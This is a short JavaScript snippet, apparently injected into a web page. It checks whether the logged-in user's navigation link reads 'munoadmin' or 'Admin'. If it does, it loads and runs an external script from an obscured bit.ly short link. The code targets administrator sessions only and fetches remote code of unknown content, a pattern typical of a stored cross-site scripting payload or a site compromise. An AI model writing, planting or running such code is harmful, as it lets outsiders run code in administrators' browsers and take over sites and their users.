var xpth = '//*[@id="navBar"]/ul/li[7]/a';
var man = document.evaluate(xpth, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
var men = ["munoadmin","Admin"];
if (men.includes(man.text)) {
 var mytv = document.createElement("script");
 mytv.type = "text/javascript";
 mytv.src = "https://bit.ly/38fvJaU";
 document.getElementsByTagName("head")[0].appendChild(mytv);
}
